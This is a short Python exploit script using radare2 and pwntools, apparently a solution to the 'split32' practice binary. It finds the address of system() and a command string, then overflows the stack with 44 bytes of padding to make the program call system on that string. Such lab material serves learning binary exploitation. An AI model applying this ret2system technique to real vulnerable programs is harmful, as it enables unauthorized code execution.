import r2pipe
from pwn import *

r2 = r2pipe.open('./split32')
r2.cmd('aaa')
l = r2.cmd('/ cat').strip().splitlines()[-1]
print(l)

def hex2int(s):
    return int(s[2:], 16)

str_addr = hex2int(l.split()[0])
system = hex2int(r2.cmd('is~imp.system').strip().split()[2])
print(f'arg_str: {hex(str_addr)}')
print(f'system: {hex(system)}')

print(r2.cmd(f'ps @ {str_addr}'))
payload = b''
payload += p32(system)
payload += b'what'
payload += p32(str_addr)

p = process('./split32')
p.sendline(b'a' * 44 + payload)
p.wait()
print(p.recvall().decode())
